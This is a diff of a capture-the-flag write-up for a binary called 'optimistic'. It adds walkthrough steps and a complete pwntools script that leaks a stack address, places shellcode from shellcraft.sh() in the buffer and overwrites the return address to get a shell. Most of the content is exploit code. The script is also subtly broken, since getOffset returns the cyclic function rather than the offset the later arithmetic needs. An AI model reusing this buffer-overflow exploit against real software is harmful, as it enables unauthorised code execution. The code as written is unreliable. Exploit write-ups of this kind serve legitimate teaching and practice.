@@ -113,15 +113,111 @@ def getOffset(pattern):
     info('EIP/RIP offset : {i}'.format(i=offset))
     return cyclic
 
-sh = start()
+##sh = start()
 pattern = cyclic(1024)
 offset = getOffset(pattern)
+
 ```
 
 > OUTPUT - 104
 
-![image](https://user-images.githubusercontent.com/70703371/210704786-ff573efc-ced4-4df9-bd42-99745b260899.png)
+![image](https://user-images.githubusercontent.com/70703371/210705112-50c193d7-9702-42bd-b962-3c1993b54fa6.png)
 
+
+12. Now we need to get the location of **EBP** (leak the stack address).
+
+```py
+# LEAK THE STACK ADDRESS
+stackAddr = int(re.search(r"(0x[\w\d]+)", sh.recvlines()).group(0), 16)
+info("Stack Address Leaked: %#x", stackAddr)
+
+## remove 96 bytes to point at RSP instead of RBP | remove 96 bytes because `local_68` buffer is 96 bytes
+stackAddr = stackAddr - 96
+```
+
+13. Now set the shellcode.
+
+```py
+## create the shellcode
+shellcode = asm(shellcraft.sh())
+
+## payload
+
+p = flat(
+    [
+        shellcode,
+        cyclic(offset - len(shellcode)), # as the padding bytes
+        stackAddr
+    ]
+)
+```
+
+> THE SCRIPT SO FAR
+
+```py
+from pwn import *
+import os
+
+os.system('clear')
+
+def start(argv=[], *a, **kw):
+    if args.REMOTE: 
+        return remote(sys.argv[1], sys.argv[2], *a, **kw)
+    else:  
+        return process([exe] + argv, *a, **kw)
+
+exe = './optimistic'
+elf = context.binary = ELF(exe, checksec=False)
+context.log_level = 'debug'
+
+def getOffset(pattern):
+    sh = process(exe)
+    sh.sendlineafter(':', 'y')
+    sh.sendlineafter(':', 'aa')
+    sh.sendlineafter(':', 'aa')
+    sh.sendlineafter(':', '-1')
+    sh.sendlineafter(':', pattern)
+    sh.wait()
+    offset = cyclic_find(sh.corefile.read(sh.corefile.sp,4))
+    info('EIP/RIP offset : {i}'.format(i=offset))
+    return cyclic
+
+pattern = cyclic(1024)
+offset = getOffset(pattern)
+
+sh = start()
+
+# LEAK THE STACK ADDRESS
+stackAddr = int(re.search(r"(0x[\w\d]+)", sh.recvlines()).group(0), 16)
+info("Stack Address Leaked: %#x", stackAddr)
+
+## remove 96 bytes to point at RSP instead of RBP | remove 96 bytes because `local_68` buffer is 96 bytes
+stackAddr = stackAddr - 96
+
+## create the shellcode
+shellcode = asm(shellcraft.sh())
+
+## payload
+
+p = flat(
+    [
+        shellcode,
+        cyclic(offset - len(shellcode)), # as the padding bytes
+        stackAddr
+    ]
+)
+
+sh.sendlineafter(':','y')
+sh.sendlineafter(':','aa')
+sh.sendlineafter(':','aa')
+sh.sendlineafter(':','-1')
+sh.sendlineafter(':',p)
+
+sh.interactive()
+
+```
+
+> OUTPUT
 
 
 
